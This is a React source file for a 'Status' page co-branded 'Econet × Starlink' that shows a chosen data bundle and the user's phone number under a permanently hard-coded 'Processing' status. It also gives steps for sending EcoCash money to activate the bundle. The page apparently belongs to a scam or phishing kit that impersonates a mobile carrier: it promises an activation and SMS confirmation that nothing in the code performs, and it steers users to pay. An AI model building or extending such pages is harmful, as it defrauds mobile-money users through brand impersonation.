import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '../AppContext';
import './Status.css';

export default function Status() {
  const navigate = useNavigate();
  const { selectedPlan, authData } = useApp();
  const [view, setView] = useState('main'); // main | deposit

  const plan  = selectedPlan || { data: 'N/A', validity: 'N/A', price: 0, tag: 'Bundle' };
  const phone = authData.phoneNumber || 'N/A';

  if (view === 'deposit') {
    return (
      <div className="st-root">
        <StBg />
        <div className="st-subpage">
          <div className="st-subpage-header">
            <button className="st-back-btn" onClick={() => setView('main')}>←</button>
            <h2 className="st-subpage-title">Deposit Funds</h2>
          </div>
          <div className="st-subpage-card">
            <div className="st-info-row">
              <span className="st-info-label">📱 ECOCASH ACCOUNT</span>
              <span className="st-info-val">{phone}</span>
            </div>
            <div className="st-info-row">
              <span className="st-info-label">📦 SELECTED BUNDLE</span>
              <span className="st-info-val">{plan.data} — ${plan.price.toFixed(2)} / {plan.validity}</span>
            </div>

            <div className="st-deposit-notice">
              <span>ℹ️</span>
              <p>Ensure you have enough amount in your EcoCash account to activate the selected package.</p>
            </div>

            <div className="st-steps-title">How to Top Up</div>
            {[
              'Open EcoCash or dial *151#',
              'Select "Send Money" or "Deposit"',
              `Enter your account: ${phone}`,
              `Enter the amount for your ${plan.data} bundle ($${plan.price.toFixed(2)})`,
              'Confirm and complete the transaction',
              'Wait for your confirmation SMS',
            ].map((s, i) => (
              <div className="st-step" key={i}>
                <span className="st-step-num">{i + 1}</span>
                <p className="st-step-text">{s}</p>
              </div>
            ))}

            <div className="st-tip">
              <span>💡</span>
              <p>Make sure your EcoCash USD Wallet has sufficient balance before proceeding with bundle activation.</p>
            </div>

            <button className="st-complete-btn" onClick={() => setView('main')}>
              ✓ Done
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="st-root">
      <StBg />

      <header className="st-header">
        <div className="st-logo">
          <img src="/logo.png" alt="" className="st-logo-img" onError={e => e.target.style.display='none'} />
          <span className="st-logo-eco">Eco</span><span className="st-logo-net">net</span>
        </div>
        <div className="st-header-tag">× Starlink</div>
      </header>

      <main className="st-main">

        {/* Status badge */}
        <div className="st-status-badge">
          <div className="st-clock-ring">
            <span className="st-clock-icon">⏳</span>
          </div>
          <div>
            <h1 className="st-congrats">Bundle Activation in Progress</h1>
            <p className="st-congrats-sub">You will receive a confirmation message shortly</p>
          </div>
        </div>

        {/* Bundle card */}
        <div className="st-bundle-card">
          <div className="st-bundle-tag">SELECTED BUNDLE</div>
          <div className="st-bundle-data">{plan.data}</div>
          {plan.speed && <div className="st-bundle-speed">@ {plan.speed}</div>}
          <div className="st-bundle-validity">Valid for {plan.validity}</div>
          <div className="st-bundle-divider" />
          <div className="st-bundle-row">
            <span className="st-bundle-label">Bundle Price</span>
            <span className="st-bundle-val">${plan.price.toFixed(2)}</span>
          </div>
          <div className="st-bundle-row">
            <span className="st-bundle-label">Account</span>
            <span className="st-bundle-val">{phone}</span>
          </div>
          <div className="st-bundle-row">
            <span className="st-bundle-label">Status</span>
            <span className="st-bundle-val st-bundle-processing">⏳ Processing</span>
          </div>
        </div>

        {/* Notice */}
        <div className="st-notice">
          <span className="st-notice-icon">ℹ️</span>
          <div>
            <p className="st-notice-title">Account Balance Required</p>
            <p className="st-notice-text">
              Ensure you have enough amount in your EcoCash account to activate the selected package.
            </p>
          </div>
        </div>

        {/* Actions */}
        <div className="st-actions">
          <h3 className="st-actions-title">Quick Actions</h3>
          <div className="st-action-grid">
            <button className="st-action-btn" onClick={() => setView('deposit')}>
              <span className="st-action-icon">💰</span>
              <span>Deposit</span>
            </button>
            <button className="st-action-btn" onClick={() => navigate('/')}>
              <span className="st-action-icon">📡</span>
              <span>New Bundle</span>
            </button>
            <button className="st-action-btn" onClick={() => window.location.href='https://ecocash.co.zw/contact-us/'}>
              <span className="st-action-icon">🛟</span>
              <span>Support</span>
            </button>
          </div>
        </div>

        <div className="st-sms-note">
          📱 You will receive an SMS confirmation with your bundle details within minutes.
        </div>

      </main>

      <footer className="st-footer">© 2026 Econet × Starlink</footer>
    </div>
  );
}

function StBg() {
  return (
    <>
      <div className="st-stars">
        {[...Array(60)].map((_, i) => (
          <div key={i} className="st-star" style={{
            left: `${Math.random() * 100}%`,
            top: `${Math.random() * 100}%`,
            animationDelay: `${Math.random() * 3}s`,
            width: `${Math.random() * 2 + 1}px`,
            height: `${Math.random() * 2 + 1}px`,
          }} />
        ))}
      </div>
      <div className="st-bg-glow" />
    </>
  );
}